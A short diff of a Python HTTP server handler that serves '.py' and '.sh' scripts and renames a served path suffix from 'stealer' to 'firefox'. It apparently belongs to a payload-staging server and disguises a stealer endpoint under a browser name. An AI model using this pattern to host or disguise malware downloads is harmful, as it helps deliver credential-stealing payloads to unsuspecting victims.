@@ -45,7 +45,7 @@ class ServerHandler(http.server.SimpleHTTPRequestHandler):
         if self.path == '/':
             self.send_response(404)
             self.end_headers()
-        elif self.path.endswith('.py') or self.path.endswith('.sh') or self.path.endswith('stealer'):
+        elif self.path.endswith('.py') or self.path.endswith('.sh') or self.path.endswith('firefox'):
             script_name = self.path.lstrip('/')
             script_path = Path(script_name)
             
